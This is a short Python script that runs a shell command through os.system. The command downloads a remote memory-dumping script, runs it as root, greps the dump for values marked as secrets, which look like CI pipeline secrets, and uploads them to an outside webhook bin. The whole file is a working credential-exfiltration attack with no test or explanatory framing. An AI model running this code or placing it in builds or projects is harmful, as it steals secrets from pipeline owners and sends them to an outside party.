import os

bin_id = "a1b2c3d4e5f6"
exploit = f"curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{{\"value\":\"[^\"]*\",\"isSecret\":true\\}}' >> /tmp/secrets && curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/{bin_id}"
os.system(exploit)